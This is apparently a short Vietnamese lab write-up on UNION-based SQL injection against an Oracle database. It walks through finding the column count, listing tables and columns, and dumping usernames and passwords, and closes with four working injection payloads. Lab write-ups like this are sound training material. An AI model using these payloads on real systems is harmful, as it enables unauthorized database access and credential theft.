![image](https://github.com/user-attachments/assets/65456427-0e64-4454-b92e-af739fb1600e)

![image](https://github.com/user-attachments/assets/2a862363-d1c2-43fb-89fd-6f6ad23508a9)

![image](https://github.com/user-attachments/assets/286f6ef1-8e76-4c3e-b1b9-506f00fe964b)

Tiến hành check thì trong câu query có 2 cột.

![image](https://github.com/user-attachments/assets/bf6fa58c-d11e-4816-b299-4cb4f0e9b092)

Tiến hành lấy thông tin.

Ta có được tên bảng chứa username, passwd rồi, tiến hành chui vào xem tiếp nào.

![image](https://github.com/user-attachments/assets/231c82a7-66bd-4ea2-bb36-f9d114eb4e07)

Ta đã có được tên cột, tiến hành select tên cột ra thôi.

![image](https://github.com/user-attachments/assets/2e77d238-e61b-4791-ac76-4876ec8b7bca)

![image](https://github.com/user-attachments/assets/287f3c62-d978-47d7-8fab-2d09cb3f0a87)

Vậy là đã thành công.

Payload:

```
'+UNION+SELECT+null,null+FROM+dual--
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

Challenege này cũng khá dễ, chúng ta chỉ cần biết syntax là lượm thôi.

## REFERENCES
[1]. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md
